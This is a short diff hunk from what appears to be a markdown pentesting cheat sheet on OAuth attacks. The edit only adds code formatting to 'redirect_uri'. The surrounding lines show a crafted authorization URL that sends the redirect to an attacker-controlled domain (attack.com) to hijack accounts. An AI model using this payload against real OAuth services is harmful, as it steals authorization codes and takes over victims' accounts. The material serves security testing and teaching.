@@ -52,7 +52,7 @@ Exploitation: repeat this request with an arbitrary account (changing email and 
 
 ### <mark style="color:yellow;">Account hijacking via redirect\_uri</mark>
 
-Replace redirect\_uri with a attacker controlled domain
+Replace `redirect_uri` with a attacker controlled domain
 
 ```
 https://oauth-x.oauth-server.net/auth?client_id=xyz&redirect_uri=https://attack.com/oauth-callback&response_type=code&scope=openid profile email
